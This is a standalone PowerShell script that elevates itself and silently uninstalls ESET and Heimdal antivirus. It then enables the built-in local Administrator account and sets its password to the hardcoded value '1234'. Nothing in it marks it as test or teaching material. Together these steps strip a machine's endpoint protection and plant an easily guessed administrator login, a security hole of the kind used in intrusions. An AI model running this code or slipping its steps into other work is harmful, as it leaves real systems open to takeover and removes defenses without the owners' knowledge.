#Requires -Version 5.1
<#
.SYNOPSIS
    - Self-elevates to admin
    - Uninstalls ESET AV if present
    - Uninstalls Heimdal AV if present
    - Enables local Administrator account
    - Sets local Administrator password
#>

# ------------------------------------------------------------------
# 0. Auto-elevate if not running as admin
# ------------------------------------------------------------------
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Not running as admin, relaunching elevated..."
    $scriptPath = $MyInvocation.MyCommand.Definition
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
    exit
}

Write-Host "Running with admin privileges." -ForegroundColor Green

# ------------------------------------------------------------------
# Helper: find & silently uninstall by DisplayName match via registry
# ------------------------------------------------------------------
function Uninstall-ByDisplayNameMatch {
    param(
        [string]$Pattern,
        [string]$FriendlyName
    )

    $uninstallKeys = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
    )

    $apps = Get-ItemProperty -Path $uninstallKeys -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName -match $Pattern }

    if (-not $apps) {
        Write-Host "$FriendlyName not found. Skipping." -ForegroundColor Yellow
        return
    }

    foreach ($app in $apps) {
        Write-Host "Found $($app.DisplayName). Attempting uninstall..." -ForegroundColor Cyan

        $uninstallString = $app.UninstallString
        if (-not $uninstallString) {
            Write-Host "No UninstallString found for $($app.DisplayName). Skipping." -ForegroundColor Red
            continue
        }

        try {
            if ($uninstallString -match "msiexec") {
                # Extract the product code / args and force silent + no restart
                $productCode = [regex]::Match($uninstallString, "\{[0-9A-Fa-f\-]+\}").Value
                if ($productCode) {
                    Start-Process "msiexec.exe" -ArgumentList "/x $productCode /qn /norestart" -Wait -NoNewWindow
                } else {
                    Start-Process "msiexec.exe" -ArgumentList "$uninstallString /qn /norestart" -Wait -NoNewWindow
                }
            }
            else {
                # EXE-based uninstaller - try common silent flags
                $exePath = $uninstallString
                $silentArgs = "/S /VERYSILENT /SUPPRESSMSGBOXES /qn /norestart"

                if ($exePath -match '^"([^"]+)"\s*(.*)$') {
                    $exeOnly = $matches[1]
                    $existingArgs = $matches[2]
                    Start-Process -FilePath $exeOnly -ArgumentList "$existingArgs $silentArgs" -Wait -NoNewWindow
                } else {
                    Start-Process -FilePath $exePath -ArgumentList $silentArgs -Wait -NoNewWindow
                }
            }
            Write-Host "$($app.DisplayName) uninstall command executed." -ForegroundColor Green
        }
        catch {
            Write-Host "Failed to uninstall $($app.DisplayName): $_" -ForegroundColor Red
        }
    }
}

# ------------------------------------------------------------------
# 1. ESET
# ------------------------------------------------------------------
Uninstall-ByDisplayNameMatch -Pattern "ESET" -FriendlyName "ESET Antivirus"

# ------------------------------------------------------------------
# 2. Heimdal
# ------------------------------------------------------------------
Uninstall-ByDisplayNameMatch -Pattern "Heimdal" -FriendlyName "Heimdal Antivirus"

# ------------------------------------------------------------------
# 3. Enable local Administrator account if disabled
# ------------------------------------------------------------------
try {
    $adminAccount = Get-LocalUser -Name "Administrator" -ErrorAction Stop

    if (-not $adminAccount.Enabled) {
        Write-Host "Local Administrator account is disabled. Enabling..." -ForegroundColor Cyan
        Enable-LocalUser -Name "Administrator"
        Write-Host "Local Administrator account enabled." -ForegroundColor Green
    } else {
        Write-Host "Local Administrator account is already enabled." -ForegroundColor Green
    }
}
catch {
    Write-Host "Could not query/enable local Administrator account: $_" -ForegroundColor Red
}

# ------------------------------------------------------------------
# 4. Set local Administrator password
# ------------------------------------------------------------------
try {
    $securePassword = ConvertTo-SecureString "1234" -AsPlainText -Force
    Set-LocalUser -Name "Administrator" -Password $securePassword
    Write-Host "Local Administrator password updated." -ForegroundColor Green
}
catch {
    Write-Host "Failed to set Administrator password: $_" -ForegroundColor Red
}

Write-Host "`nScript complete." -ForegroundColor Green
